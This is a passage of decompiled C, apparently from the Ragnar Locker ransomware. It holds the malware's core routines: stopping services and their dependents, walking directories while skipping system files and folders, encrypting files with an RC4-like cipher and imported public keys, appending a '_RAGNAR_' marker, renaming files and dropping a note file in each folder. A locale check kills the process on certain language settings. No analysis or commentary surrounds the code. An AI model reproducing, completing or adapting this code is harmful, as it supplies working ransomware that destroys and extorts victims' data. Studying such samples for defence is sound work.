  DWORD dwBytes; // [esp+90h] [ebp-4h] BYREF
  CHAR *lpServiceNamea; // [esp+9Ch] [ebp+8h]

  TickCount = GetTickCount();
  v2 = OpenServiceA(hSCManager, lpServiceName, 0x2Cu);
  lpServiceNamea = (CHAR *)v2;
  if ( !v2 )
    return CloseServiceHandle(hSCManager);
  if ( QueryServiceStatusEx(v2, SC_STATUS_PROCESS_INFO, (LPBYTE)&Buffer, 0x24u, &pcbBytesNeeded)
    && Buffer.dwCurrentState != 1 )
  {
    v4 = Sleep;
    if ( Buffer.dwCurrentState == 3 )
    {
      while ( 1 )
      {
        v5 = Buffer.dwWaitHint / 0xA;
        if ( Buffer.dwWaitHint / 0xA >= 0x3E8 )
        {
          if ( v5 > 0x2710 )
            v5 = 10000;
        }
        else
        {
          v5 = 1000;
        }
        Sleep(v5);
        if ( !QueryServiceStatusEx(
                (SC_HANDLE)lpServiceNamea,
                SC_STATUS_PROCESS_INFO,
                (LPBYTE)&Buffer,
                0x24u,
                &pcbBytesNeeded)
          || Buffer.dwCurrentState == 1
          || GetTickCount() - TickCount > 0x7530 )
        {
          break;
        }
        if ( Buffer.dwCurrentState != 3 )
          goto LABEL_14;
      }
    }
    else
    {
LABEL_14:
      v17 = GetTickCount();
      if ( !EnumDependentServicesA((SC_HANDLE)lpServiceNamea, 1u, 0, 0, &dwBytes, &ServicesReturned)
        && GetLastError() == 234 )
      {
        v12 = dwBytes;
        ProcessHeap = GetProcessHeap();
        v7 = (struct _ENUM_SERVICE_STATUSA *)HeapAlloc(ProcessHeap, 8u, v12);
        lpMem = v7;
        if ( v7 )
        {
          if ( EnumDependentServicesA((SC_HANDLE)lpServiceNamea, 1u, v7, dwBytes, &dwBytes, &ServicesReturned) )
          {
            v21 = 0;
            if ( ServicesReturned )
            {
              v9 = (__m128i *)lpMem;
              v20 = (char *)lpMem;
              while ( 1 )
              {
                v10 = OpenServiceA(hSCManager, (LPCSTR)_mm_cvtsi128_si32(*v9), 0x24u);
                if ( !v10 )
                  break;
                if ( !ControlService(v10, 1u, &ServiceStatus) )
                {
LABEL_30:
                  CloseServiceHandle(v10);
                  break;
                }
                while ( ServiceStatus.dwCurrentState != 1 )
                {
                  Sleep(ServiceStatus.dwWaitHint);
                  if ( !QueryServiceStatusEx(v10, SC_STATUS_PROCESS_INFO, (LPBYTE)&ServiceStatus, 0x24u, &dwBytes) )
                    goto LABEL_33;
                  if ( ServiceStatus.dwCurrentState == 1 )
                    break;
                  if ( GetTickCount() - v17 > 0x7530 )
                    goto LABEL_30;
                }
                v9 = (__m128i *)(v20 + 36);
                ++v21;
                v20 += 36;
                if ( v21 >= ServicesReturned )
                  goto LABEL_32;
              }
            }
            else
            {
              v10 = hSCManager;
LABEL_32:
              CloseServiceHandle(v10);
              v14 = lpMem;
              v11 = GetProcessHeap();
              HeapFree(v11, 0, v14);
            }
LABEL_33:
            v4 = Sleep;
          }
          else
          {
            v13 = lpMem;
            v8 = GetProcessHeap();
            HeapFree(v8, 0, v13);
          }
        }
      }
      if ( ControlService((SC_HANDLE)lpServiceNamea, 1u, &Buffer) && Buffer.dwCurrentState != 1 )
      {
        do
          v4(Buffer.dwWaitHint);
        while ( QueryServiceStatusEx(
                  (SC_HANDLE)lpServiceNamea,
                  SC_STATUS_PROCESS_INFO,
                  (LPBYTE)&Buffer,
                  0x24u,
                  &pcbBytesNeeded)
             && Buffer.dwCurrentState != 1
             && GetTickCount() - TickCount <= 0x7530
             && Buffer.dwCurrentState != 1 );
      }
    }
  }
  return CloseServiceHandle((SC_HANDLE)lpServiceNamea);
}

//----- (00401490) --------------------------------------------------------
int __cdecl sub_401490(LPCWSTR lpFileName)
{
  const WCHAR *v1; // ebx
  DWORD FileAttributesW; // eax
  HANDLE FileW; // edi
  __int64 v4; // rax
  signed __int64 v5; // kr08_8
  LARGE_INTEGER v6; // rax
  DWORD QuadPart; // ebx
  int v9; // esi
  unsigned __int64 v10; // rt0
  LARGE_INTEGER v11; // kr10_8
  LARGE_INTEGER v12; // kr18_8
  HANDLE ProcessHeap; // eax
  void *v14; // eax
  int v15; // edx
  LONG HighPart; // eax
  LONG v17; // ecx
  DWORD v18; // eax
  unsigned int v19; // eax
  DWORD v20; // ecx
  unsigned int v21; // kr00_4
  BOOL v22; // esi
  HANDLE v23; // eax
  void *v24; // [esp-4h] [ebp-4BCh]
  WCHAR String1[520]; // [esp+Ch] [ebp-4ACh] BYREF
  __int128 v26; // [esp+41Ch] [ebp-9Ch] BYREF
  __int128 v27; // [esp+42Ch] [ebp-8Ch]
  __int128 v28; // [esp+43Ch] [ebp-7Ch]
  __int128 v29; // [esp+44Ch] [ebp-6Ch]
  DWORD NumberOfBytesWritten; // [esp+45Ch] [ebp-5Ch] BYREF
  DWORD v31; // [esp+460h] [ebp-58h] BYREF
  LARGE_INTEGER v32; // [esp+464h] [ebp-54h] BYREF
  DWORD NumberOfBytesRead; // [esp+46Ch] [ebp-4Ch] BYREF
  __int64 v34; // [esp+470h] [ebp-48h]
  LARGE_INTEGER v35; // [esp+478h] [ebp-40h]
  LARGE_INTEGER NewFilePointer; // [esp+480h] [ebp-38h] BYREF
  LARGE_INTEGER liDistanceToMove; // [esp+488h] [ebp-30h]
  DWORD v38; // [esp+490h] [ebp-28h] BYREF
  int Buffer[3]; // [esp+494h] [ebp-24h] BYREF
  LPVOID lpMem; // [esp+4A0h] [ebp-18h]
  unsigned int QuadPart_high; // [esp+4A4h] [ebp-14h]
  LARGE_INTEGER FileSize; // [esp+4A8h] [ebp-10h] BYREF
  LPVOID lpBuffer; // [esp+4B0h] [ebp-8h]
  int v44; // [esp+4B4h] [ebp-4h]

  v1 = lpFileName;
  FileAttributesW = GetFileAttributesW(lpFileName);
  if ( (FileAttributesW & 1) != 0 )
    SetFileAttributesW(lpFileName, FileAttributesW & 0xFFFFFFFE);
  NumberOfBytesRead = 0;
  v38 = 0;
  FileW = CreateFileW(lpFileName, 0x40000005u, 2u, 0, 3u, 0x10000080u, 0);
  if ( FileW != (HANDLE)-1 )
  {
    GetFileSizeEx(FileW, &FileSize);
    v4 = sub_402320(1024i64, 1u);
    v5 = sub_407620(v4, v4);
    v6 = FileSize;
    v44 = HIDWORD(v5);
    if ( !FileSize.QuadPart )
    {
      CloseHandle(FileW);
      return 1;
    }
    if ( FileSize.QuadPart > v5 )
    {
      lpMem = (LPVOID)(5 * v5);
      if ( FileSize.HighPart > (int)((unsigned __int64)(5 * v5) >> 32)
        || (v6.LowPart = FileSize.LowPart, FileSize.HighPart >= (int)((unsigned __int64)(5 * v5) >> 32))
        && FileSize.LowPart >= (unsigned int)lpMem )
      {
        lpBuffer = (LPVOID)(5 * v5);
        HIDWORD(v10) = (__PAIR64__(v44, v5) >> 30) + __CFADD__(4 * v5, (_DWORD)v5) + v44;
        LODWORD(v10) = 5 * v5;
        lpMem = (LPVOID)(v10 >> 30);
        v6.QuadPart = __PAIR64__(v44, FileSize.LowPart);
        if ( FileSize.HighPart > (int)lpMem )
        {
          if ( FileSize.QuadPart < __SPAIR64__((unsigned int)lpMem, 20 * (int)v5) )
          {
            v11 = NewFilePointer;
            QuadPart_high = HIDWORD(v11.QuadPart);
            QuadPart = v11.QuadPart;
            v12 = NewFilePointer;
            v44 = HIDWORD(v12.QuadPart);
            v9 = v12.QuadPart;
          }
          else
          {
            QuadPart_high = v44;
            QuadPart = v5;
            v6.LowPart = 8 * v5;
            v9 = 9 * v5;
            v44 = (v6.QuadPart + __PAIR64__(__PAIR64__(v44, v5) >> 29, v5)) >> 32;
          }
          v6.LowPart = FileSize.LowPart;
        }
        else
        {
          QuadPart = v5;
          QuadPart_high = v44;
          v44 = __PAIR64__(v44, v5) >> 31;
          v9 = 2 * v5;
        }
      }
      else
      {
        QuadPart = v5;
        QuadPart_high = v44;
        v9 = 1;
        v44 = 0;
      }
      v6.HighPart = FileSize.HighPart;
    }
    else
    {
      QuadPart_high = FileSize.HighPart;
      QuadPart = FileSize.LowPart;
      v9 = 1;
      v44 = 0;
    }
    strcpy((char *)Buffer, "_RAGNAR_");
    SetFilePointerEx(FileW, (LARGE_INTEGER)(v6.QuadPart - 9), 0, 0);
    ProcessHeap = GetProcessHeap();
    v14 = HeapAlloc(ProcessHeap, 8u, 9u);
    lpMem = v14;
    if ( v14 )
    {
      ReadFile(FileW, v14, 9u, &NumberOfBytesRead, 0);
      v14 = lpMem;
    }
    v15 = 0;
    HighPart = (_BYTE *)v14 - (_BYTE *)Buffer;
    liDistanceToMove.HighPart = HighPart;
    while ( *((_BYTE *)Buffer + v15 + HighPart) == *((_BYTE *)Buffer + v15) )
    {
      HighPart = liDistanceToMove.HighPart;
      if ( ++v15 >= 9 )
        goto LABEL_37;
    }
    v26 = 0i64;
    v27 = 0i64;
    v28 = 0i64;
    v29 = 0i64;
    sub_402720((char *)&v26, pbBuffer, byte_40A338);
    *(_QWORD *)&v28 = 0i64;
    DWORD2(v27) = (unsigned __int8)byte_40A330 | (((unsigned __int8)byte_40A331 | ((unsigned __int16)word_40A332 << 8)) << 8);
    HIDWORD(v27) = unk_40A334 | ((unk_40A335 | ((unsigned __int16)word_40A336 << 8)) << 8);
    lpBuffer = VirtualAlloc(0, QuadPart, 0x3000u, 4u);
    if ( lpBuffer )
    {
      liDistanceToMove.QuadPart = 0i64;
      SetFilePointerEx(FileW, 0i64, 0, 0);
      v34 = 0i64;
      if ( v44 >= 0 && (v44 > 0 || v9) )
      {
        v17 = HIDWORD(v34);
        liDistanceToMove.HighPart = HIDWORD(v34);
        v18 = v34;
        HIDWORD(v34) = v34;
        do
        {
          if ( v17 | v18 )
          {
            v19 = QuadPart_high;
            v20 = QuadPart;
          }
          else
          {
            v35.QuadPart = 0i64;
            v19 = 0;
            v20 = 0;
          }
          v32.QuadPart = __PAIR64__(v19, v20);
          v35.HighPart = SetFilePointerEx(FileW, (LARGE_INTEGER)__PAIR64__(v19, v20), &NewFilePointer, 1u);
          if ( ReadFile(FileW, lpBuffer, QuadPart, &v31, 0) )
          {
            SetFilePointerEx(FileW, NewFilePointer, &v32, 0);
            sub_402380(&v26, lpBuffer, lpBuffer, __SPAIR64__(QuadPart_high, QuadPart));
            LockFile(FileW, v35.HighPart, 0, QuadPart, 0);
            WriteFile(FileW, lpBuffer, QuadPart, &NumberOfBytesWritten, 0);
            UnlockFile(FileW, v35.HighPart, 0, QuadPart, 0);
          }
          v21 = HIDWORD(v34);
          HIDWORD(v34) += QuadPart;
          v17 = (__PAIR64__(liDistanceToMove.HighPart, QuadPart) + __PAIR64__(QuadPart_high, v21)) >> 32;
          v18 = QuadPart + v21;
          liDistanceToMove.HighPart = v17;
        }
        while ( __SPAIR64__(v17, QuadPart + v21) < __SPAIR64__(v44, v9) );
      }
      VirtualFree(lpBuffer, 0, 0x8000u);
      v22 = SetFilePointerEx(FileW, FileSize, 0, 0);
      LockFile(FileW, v22, 0, 0x109u, 0);
      WriteFile(FileW, ::lpBuffer, 0x100u, &v38, 0);
      WriteFile(FileW, dword_40A008, 0x100u, &v38, 0);
      WriteFile(FileW, Buffer, 9u, &v38, 0);
      UnlockFile(FileW, v22, 0, 0x109u, 0);
    }
LABEL_37:
    v24 = lpMem;
    v23 = GetProcessHeap();
    HeapFree(v23, 1u, v24);
    v1 = lpFileName;
  }
  CloseHandle(FileW);
  lstrcpyW(String1, v1);
  lstrcatW(String1, &String2);
  MoveFileExW(v1, String1, 3u);
  return 1;
}
// 40A310: using guessed type BYTE pbBuffer[32];
// 40A330: using guessed type char byte_40A330;
// 40A331: using guessed type char byte_40A331;
// 40A332: using guessed type __int16 word_40A332;
// 40A336: using guessed type __int16 word_40A336;
// 40A338: using guessed type BYTE byte_40A338[3272];

//----- (00401910) --------------------------------------------------------
BOOL __thiscall sub_401910(HCRYPTKEY *this, const void *a2, DWORD pdwDataLen, BYTE **a4)
{
  DWORD v4; // ebx
  HANDLE ProcessHeap; // eax
  BYTE *v6; // eax
  BYTE **v7; // edx
  DWORD v8; // ecx
  BOOL v9; // esi
  SIZE_T v11; // [esp-4h] [ebp-14h]

  v4 = 10 * pdwDataLen;
  v11 = 10 * pdwDataLen;
  ProcessHeap = GetProcessHeap();
  v6 = (BYTE *)HeapAlloc(ProcessHeap, 8u, v11);
  v7 = a4;
  v8 = v4;
  *a4 = v6;
  if ( v4 )
  {
    do
    {
      *v6++ = 0;
      --v8;
    }
    while ( v8 );
    v6 = *v7;
  }
  a4 = (BYTE **)v6;
  qmemcpy(v6, a2, pdwDataLen);
  v9 = CryptEncrypt(this[1], 0, 1, 0, *v7, &pdwDataLen, v4);
  GetLastError();
  return v9;
}

//----- (004019A0) --------------------------------------------------------
char __cdecl sub_4019A0(LPCWSTR lpFileName, int a2, LPWSTR FilePart)
{
  HANDLE (__stdcall *v3)(LPCWSTR, LPWIN32_FIND_DATAW); // ebx
  const WCHAR *v4; // esi
  HANDLE FirstFileW; // eax
  int v6; // esi
  int v7; // eax
  HANDLE v8; // eax
  const WCHAR *ExtensionW; // eax
  const WCHAR *v10; // ebx
  int v11; // esi
  int v12; // eax
  const WCHAR *v13; // ebx
  int v14; // esi
  WCHAR String1[260]; // [esp+Ch] [ebp-AB8h] BYREF
  WCHAR Buffer[260]; // [esp+214h] [ebp-8B0h] BYREF
  WCHAR NewFileName[262]; // [esp+41Ch] [ebp-6A8h] BYREF
  WCHAR String2[260]; // [esp+628h] [ebp-49Ch] BYREF
  struct _WIN32_FIND_DATAW FindFileData; // [esp+830h] [ebp-294h] BYREF
  LPCWSTR lpString1; // [esp+A80h] [ebp-44h]
  LPCWSTR v22[3]; // [esp+A84h] [ebp-40h]
  LPCWSTR lpString2; // [esp+A90h] [ebp-34h]
  const wchar_t *v24; // [esp+A94h] [ebp-30h]
  const wchar_t *v25; // [esp+A98h] [ebp-2Ch]
  const wchar_t *v26; // [esp+A9Ch] [ebp-28h]
  const wchar_t *v27; // [esp+AA0h] [ebp-24h]
  LPCWSTR v28; // [esp+AA4h] [ebp-20h]
  const wchar_t *v29; // [esp+AA8h] [ebp-1Ch]
  const wchar_t *v30; // [esp+AACh] [ebp-18h]
  const wchar_t *v31; // [esp+AB0h] [ebp-14h]
  const wchar_t *v32; // [esp+AB4h] [ebp-10h]
  const wchar_t *v33; // [esp+AB8h] [ebp-Ch]
  const wchar_t *v34; // [esp+ABCh] [ebp-8h]
  HANDLE hFindFile; // [esp+AC0h] [ebp-4h]

  v3 = FindFirstFileW;
  v4 = lpFileName;
  memset(&FindFileData, 0, sizeof(FindFileData));
  if ( FilePart )
  {
    if ( !GetFullPathNameW(lpFileName, 0x104u, Buffer, &FilePart) )
      return 0;
    lstrcpyW(String1, FilePart);
    lstrcpyW(FilePart, L"*.*");
    FindFileData.dwFileAttributes = 16;
    FirstFileW = FindFirstFileW(Buffer, &FindFileData);
    hFindFile = FirstFileW;
    if ( FirstFileW != (HANDLE)-1 )
    {
      do
      {
        if ( lstrcmpiW(FindFileData.cFileName, L".")
          && lstrcmpiW(FindFileData.cFileName, L"..")
          && (FindFileData.dwFileAttributes & 0x10) != 0 )
        {
          if ( a2 == 1 )
          {
            lpString2 = L"Windows";
            v6 = 0;
            v24 = L"Windows.old";
            v25 = L"Tor browser";
            v26 = L"Internet Explorer";
            v27 = L"Google";
            v28 = L"Opera";
            v29 = L"Opera Software";
            v30 = L"Mozilla";
            v31 = L"Mozilla Firefox";
            v32 = L"$Recycle.Bin";
            v33 = L"ProgramData";
            v34 = L"All Users";
            while ( lstrcmpiW(FindFileData.cFileName, (&lpString2)[v6]) )
            {
              if ( ++v6 >= 12 )
                goto LABEL_11;
            }
            v7 = 1;
          }
          else
          {
LABEL_11:
            v7 = 0;
          }
          if ( !v7 )
          {
            if ( !GetFullPathNameW(lpFileName, 0x104u, String2, &FilePart) )
              return 0;
            lstrcpyW(FilePart, FindFileData.cFileName);
            lstrcatW(String2, L"\\");
            lstrcpyW(NewFileName, String2);
            lstrcatW(NewFileName, &::String1);
            CopyFileW(&FileName, NewFileName, 1);
            lstrcatW(String2, String1);
            sub_4019A0(String2, a2, (LPWSTR)1);
          }
        }
      }
      while ( FindNextFileW(hFindFile, &FindFileData) );
      FirstFileW = hFindFile;
      v3 = FindFirstFileW;
      v4 = lpFileName;
    }
    FindClose(FirstFileW);
  }
  v8 = v3(v4, &FindFileData);
  hFindFile = v8;
  if ( v8 != (HANDLE)-1 )
  {
    while ( 1 )
    {
      if ( (FindFileData.dwFileAttributes & 0x10) == 0 )
      {
        if ( !GetFullPathNameW(v4, 0x104u, String2, &FilePart) )
          return 0;
        lstrcpyW(FilePart, FindFileData.cFileName);
        ExtensionW = PathFindExtensionW(String2);
        v10 = FilePart;
        v11 = 0;
        lpString1 = ExtensionW;
        v22[0] = &::String1;
        v22[1] = L"autorun.inf";
        v22[2] = L"boot.ini";
        lpString2 = L"bootfont.bin";
        v24 = L"bootsect.bak";
        v25 = L"bootmgr";
        v26 = L"bootmgr.efi";
        v27 = L"bootmgfw.efi";
        v28 = L"desktop.ini";
        v29 = L"iconcache.db";
        v30 = L"ntldr";
        v31 = L"ntuser.dat";
        v32 = L"ntuser.dat.log";
        v33 = L"ntuser.ini";
        v34 = L"thumbs.db";
        while ( lstrcmpiW(v10, v22[v11]) )
        {
          if ( (unsigned int)++v11 >= 0xF )
          {
            v12 = 1;
            goto LABEL_27;
          }
        }
        v12 = 0;
LABEL_27:
        if ( v12 == 1 )
        {
          v13 = lpString1;
          v14 = 0;
          v28 = L".db";
          v29 = L".sys";
          v30 = L".dll";
          v31 = L".lnk";
          v32 = L".msi";
          v33 = L".drv";
          v34 = L".exe";
          while ( lstrcmpiW(v13, (&v28)[v14]) )
          {
            if ( (unsigned int)++v14 >= 7 )
            {
              sub_401490(String2);
              break;
            }
          }
        }
        v8 = hFindFile;
        v4 = lpFileName;
      }
      if ( !FindNextFileW(v8, &FindFileData) )
        break;
      v8 = hFindFile;
    }
    FindClose(hFindFile);
  }
  return 1;
}
// 4082B8: using guessed type wchar_t aWindows[8];
// 4082C8: using guessed type wchar_t aWindowsOld[12];
// 4082E0: using guessed type wchar_t aTorBrowser[12];
// 4082F8: using guessed type wchar_t aInternetExplor[18];
// 40831C: using guessed type wchar_t aGoogle[7];
// 40832C: using guessed type wchar_t aOpera[6];
// 408338: using guessed type wchar_t aOperaSoftware[15];
// 408358: using guessed type wchar_t aMozilla[8];
// 408368: using guessed type wchar_t aMozillaFirefox[16];
// 408388: using guessed type wchar_t aRecycleBin[13];
// 4083A4: using guessed type wchar_t aProgramdata[12];
// 4083BC: using guessed type wchar_t aAllUsers[10];
// 4083D0: using guessed type wchar_t aAutorunInf[12];
// 4083E8: using guessed type wchar_t aBootIni[9];
// 4083FC: using guessed type wchar_t aBootfontBin[13];
// 408418: using guessed type wchar_t aBootsectBak[13];
// 408434: using guessed type wchar_t aBootmgr[8];
// 408444: using guessed type wchar_t aBootmgrEfi[12];
// 40845C: using guessed type wchar_t aBootmgfwEfi[13];
// 408478: using guessed type wchar_t aDesktopIni[12];
// 408490: using guessed type wchar_t aIconcacheDb[13];
// 4084AC: using guessed type wchar_t aNtldr[6];
// 4084B8: using guessed type wchar_t aNtuserDat[11];
// 4084D0: using guessed type wchar_t aNtuserDatLog[15];
// 4084F0: using guessed type wchar_t aNtuserIni[11];
// 408508: using guessed type wchar_t aThumbsDb[10];
// 40851C: using guessed type wchar_t aDb[4];
// 408524: using guessed type wchar_t aSys[5];
// 408530: using guessed type wchar_t aDll[5];
// 40853C: using guessed type wchar_t aLnk[5];
// 408548: using guessed type wchar_t aMsi[5];
// 408554: using guessed type wchar_t aDrv[5];
// 408560: using guessed type wchar_t aExe[5];

//----- (00401D60) --------------------------------------------------------
int sub_401D60()
{
  LPCWSTR *v0; // esi
  int v1; // edi
  int result; // eax
  HANDLE CurrentProcess; // eax
  WCHAR LCData[80]; // [esp+Ch] [ebp-1A8h] BYREF
  int v5[12]; // [esp+ACh] [ebp-108h] BYREF
  int v6[6]; // [esp+DCh] [ebp-D8h] BYREF
  int v7[6]; // [esp+F4h] [ebp-C0h] BYREF
  int v8[5]; // [esp+10Ch] [ebp-A8h] BYREF
  int v9[5]; // [esp+120h] [ebp-94h] BYREF
  int v10[4]; // [esp+134h] [ebp-80h] BYREF
  __int16 v11; // [esp+144h] [ebp-70h]
  int v12[4]; // [esp+148h] [ebp-6Ch] BYREF
  __int16 v13; // [esp+158h] [ebp-5Ch]
  int v14[4]; // [esp+15Ch] [ebp-58h] BYREF
  int v15[4]; // [esp+16Ch] [ebp-48h] BYREF
  int v16[3]; // [esp+17Ch] [ebp-38h] BYREF
  __int16 v17; // [esp+188h] [ebp-2Ch]
  int v18[3]; // [esp+18Ch] [ebp-28h] BYREF
  __int16 v19; // [esp+198h] [ebp-1Ch]
  int v20[3]; // [esp+19Ch] [ebp-18h] BYREF
  int v21[3]; // [esp+1A8h] [ebp-Ch] BYREF

  v7[0] = 7995457;
  v13 = 0;
  v19 = 0;
  v17 = 0;
  v11 = 0;
  v5[0] = (int)v7;
  v5[1] = (int)v12;
  v5[2] = (int)v6;
  v5[3] = (int)v18;
  v5[4] = (int)v16;
  v5[5] = (int)v9;
  v5[6] = (int)v21;
  v5[7] = (int)v15;
  v5[8] = (int)v14;
  v5[9] = (int)v20;
  v5[10] = (int)v8;
  v7[1] = 7471205;
  v7[2] = 6357090;
  v7[3] = 6946921;
  v7[4] = 7209057;
  v7[5] = 105;
  v12[0] = 7471169;
  v12[1] = 6619245;
  v12[2] = 6881390;
  v12[3] = 7209057;
  v6[0] = 6619202;
  v6[1] = 7274604;
  v6[2] = 7667826;
  v6[3] = 7536755;
  v6[4] = 6357097;
  v6[5] = 110;
  v18[0] = 6357067;
  v18[1] = 6357114;
  v18[2] = 6815851;
  v16[0] = 7929931;
  v16[1] = 6750322;
  v16[2] = 7995513;
  v9[0] = 7274573;
  v9[1] = 6553708;
  v9[2] = 7733345;
  v9[3] = 6357097;
  v9[4] = 110;
  v21[0] = 6357076;
  v21[1] = 6881386;
  v21[2] = 107;
  v15[0] = 7667794;
  v15[1] = 7536755;
  v15[2] = 6357097;
  v15[3] = 110;
  v14[0] = 7667796;
  v14[1] = 7012466;
  v14[2] = 6619245;
  v14[3] = 110;
  v20[0] = 7995477;
  v20[1] = 6619234;
  v20[2] = 107;
  v8[0] = 7012437;
  v8[1] = 6357106;
  v8[2] = 7209065;
  v8[3] = 6357097;
  v8[4] = 110;
  v10[0] = 6619207;
  v10[1] = 7471215;
  v10[2] = 6881383;
  v10[3] = 7209057;
  v5[11] = (int)v10;
  GetLocaleInfoW(0x800u, 0x1001u, LCData, 160);
  v0 = (LPCWSTR *)v5;
  v1 = 12;
  do
  {
    result = lstrcmpiW(LCData, *v0);
    if ( !result )
    {
      CurrentProcess = GetCurrentProcess();
      result = TerminateProcess(CurrentProcess, 0x29Au);
    }
    ++v0;
    --v1;
  }
  while ( v1 );
  return result;
}

//----- (00402000) --------------------------------------------------------
BOOL __thiscall sub_402000(HCRYPTPROV *phProv, LPCCH lpMultiByteStr)
{
  int v3; // esi
  HANDLE ProcessHeap; // eax
  WCHAR *v5; // eax
  WCHAR *v6; // esi
  HANDLE v7; // eax
  BYTE *v8; // ebx
  HANDLE v9; // eax
  BOOL v10; // esi
  HANDLE v11; // eax
  int v13; // [esp-4h] [ebp-24h]
  DWORD v14; // [esp-4h] [ebp-24h]
  HCRYPTPROV *phKey; // [esp+10h] [ebp-10h]
  DWORD pcbStructInfo; // [esp+14h] [ebp-Ch] BYREF
  struct _CERT_PUBLIC_KEY_INFO *pvStructInfo; // [esp+18h] [ebp-8h] BYREF
  DWORD pcbBinary; // [esp+1Ch] [ebp-4h] BYREF

  if ( !*phProv && !CryptAcquireContextW(phProv, 0, 0, 1u, 0xF0000000) )
    return 0;
  phKey = phProv + 1;
  if ( phProv[1] )
    CryptDestroyKey(phProv[1]);
  v3 = MultiByteToWideChar(0, 0, lpMultiByteStr, -1, 0, 0);
  ProcessHeap = GetProcessHeap();
  v5 = (WCHAR *)HeapAlloc(ProcessHeap, 8u, 2 * v3);
  v13 = v3;
  v6 = v5;
  MultiByteToWideChar(0, 0, lpMultiByteStr, -1, v5, v13);
  pcbBinary = 0;
  if ( !CryptStringToBinaryW(v6, 0, 0, 0, &pcbBinary, 0, 0) )
    return 0;
  v14 = pcbBinary;
  v7 = GetProcessHeap();
  v8 = (BYTE *)HeapAlloc(v7, 8u, v14);
  if ( !CryptStringToBinaryW(v6, 0, 0, v8, &pcbBinary, 0, 0) )
    return 0;
  v9 = GetProcessHeap();
  HeapFree(v9, 0, v6);
  pvStructInfo = 0;
  pcbStructInfo = 0;
  if ( !CryptDecodeObjectEx(1u, (LPCSTR)8, v8, pcbBinary, 0x8000u, 0, &pvStructInfo, &pcbStructInfo) )
    return 0;
  v10 = CryptImportPublicKeyInfo(*phProv, 1u, pvStructInfo, phKey);
  if ( !v10 )
    return 0;
  v11 = GetProcessHeap();
  HeapFree(v11, 0, v8);
  LocalFree(pvStructInfo);
  return v10;
}

//----- (00402150) --------------------------------------------------------
int __cdecl sub_402150(int a1, unsigned int a2, int a3, int a4)
{
  unsigned int i; // eax
  int v5; // edi
  unsigned int j; // esi
  char v7; // bl
  int v8; // esi
  int v9; // ebx
  int v10; // eax
  int v11; // edi
  char v12; // cl
  char v14[256]; // [esp+0h] [ebp-100h]

  for ( i = 0; i < 0x100; ++i )
    v14[i] = i;
  LOBYTE(v5) = 0;
  for ( j = 0; j < 0x100; ++j )
  {
    v7 = v14[j];
    v5 = (unsigned __int8)(v5 + *(_BYTE *)(j % a2 + a1) + v7);
    v14[j] = v14[v5];
    v14[v5] = v7;
  }
  v8 = a4;
  LOBYTE(v9) = 0;
  LOBYTE(v10) = 0;
  if ( a4 )
  {
    v11 = a3;
    do
    {
      ++v11;
      v12 = v14[(unsigned __int8)(v10 + 1)];
      v9 = (unsigned __int8)(v9 + v12);
      v14[(unsigned __int8)(v10 + 1)] = v14[v9];
      v10 = (unsigned __int8)(v10 + 1);
      v14[v9] = v12;
      *(_BYTE *)(v11 - 1) ^= v14[(unsigned __int8)(v14[v10] + v12)];
      --v8;
    }
    while ( v8 );
  }
  return a3;
}
// 402150: using guessed type char var_100[256];

//----- (00402230) --------------------------------------------------------
BYTE *__cdecl sub_402230(LPCWSTR lpSubKey, LPCWSTR lpValueName)
{
  BYTE *v2; // esi
  DWORD cbData; // [esp+4h] [ebp-8h] BYREF
  HKEY phkResult; // [esp+8h] [ebp-4h] BYREF

  cbData = 508;
  v2 = (BYTE *)VirtualAlloc(0, 0x1FCu, 0x3000u, 4u);
  if ( RegOpenKeyExW(HKEY_LOCAL_MACHINE, lpSubKey, 0, 0x20119u, &phkResult)
    || RegQueryValueExW(phkResult, lpValueName, 0, 0, v2, &cbData) )
  {
    RegCloseKey(phkResult);
    return 0;
  }
  else
  {
    RegCloseKey(phkResult);
    return v2;
  }
}

//----- (004022B0) --------------------------------------------------------
WCHAR *__cdecl sub_4022B0(LPCWSTR lpString)
{
  unsigned int v1; // esi
  int v2; // ebx
  int i; // edx
  int v4; // ecx
  WCHAR *v6; // [esp+Ch] [ebp-4h]

  v1 = 0;
  v6 = (WCHAR *)VirtualAlloc(0, 0x7Fu, 0x3000u, 4u);
  v2 = lstrlenW(lpString);
  for ( i = 0; i < v2; v1 = (v4 ^ 0xAB01FF3C) + v1 - __ROL4__((v4 ^ 0xAB01FF3C) + v1, 13) )
    v4 = lpString[i++];
  wsprintfW(v6, L"%08X", v1);
  return v6;
}

//----- (00402320) --------------------------------------------------------
unsigned __int64 __cdecl sub_402320(__int64 a1, unsigned int a2)
{
  __int64 v3; // kr00_8
  __int64 v4; // rax

  if ( !a2 )
    return 1i64;
  if ( a2 == 1 )
    return a1;
  v3 = sub_402320(a1, HIDWORD(a1), a2 - (a2 >> 1));
  v4 = sub_402320(a1, HIDWORD(a1), a2 >> 1);
  return sub_407620(v3, v4);
}

//----- (00402380) --------------------------------------------------------
int __thiscall sub_402380(_DWORD *this, _BYTE *a2, _BYTE *a3, __int64 a4)
{
  int result; // eax
  __int128 v5; // xmm0
  int v6; // esi
  __int128 v7; // xmm0
  unsigned int v8; // ebx
  __int128 v9; // xmm0
  unsigned int v10; // ecx
  int v11; // edx
  int v12; // edi
  int v13; // esi
  int v14; // ecx
  int v15; // eax
  int v16; // edx
  int v17; // ecx
  int v18; // eax
  bool v19; // zf
  unsigned int i; // eax
  char *v21; // esi
  int v22; // edx
  int v23; // esi
  unsigned int v24; // ebx
  _BYTE *v25; // edi
  unsigned int v26; // edx
  unsigned int v27; // ecx
  _BYTE *v28; // esi
  char v29; // al
  int v30; // esi
  int v31; // kr08_4
  char v32[2]; // [esp+0h] [ebp-E0h]
  char v33[62]; // [esp+2h] [ebp-DEh] BYREF
  int v34; // [esp+40h] [ebp-A0h]
  int v35; // [esp+44h] [ebp-9Ch]
  int v36; // [esp+48h] [ebp-98h]
  int v37; // [esp+4Ch] [ebp-94h]
  __int128 v38; // [esp+50h] [ebp-90h]
  __int128 v39; // [esp+60h] [ebp-80h]
  __int128 v40; // [esp+70h] [ebp-70h]
  __int128 v41; // [esp+80h] [ebp-60h]
  __int64 v42; // [esp+90h] [ebp-50h]
  _DWORD *v43; // [esp+98h] [ebp-48h]
  int v44; // [esp+9Ch] [ebp-44h]
  int v45; // [esp+A0h] [ebp-40h]
  int v46; // [esp+A4h] [ebp-3Ch]
  int v47; // [esp+A8h] [ebp-38h]
  int v48; // [esp+ACh] [ebp-34h]
  int v49; // [esp+B0h] [ebp-30h]
  int v50; // [esp+B4h] [ebp-2Ch]
  int v51; // [esp+B8h] [ebp-28h]
  int v52; // [esp+BCh] [ebp-24h]
  unsigned int v53; // [esp+C0h] [ebp-20h]
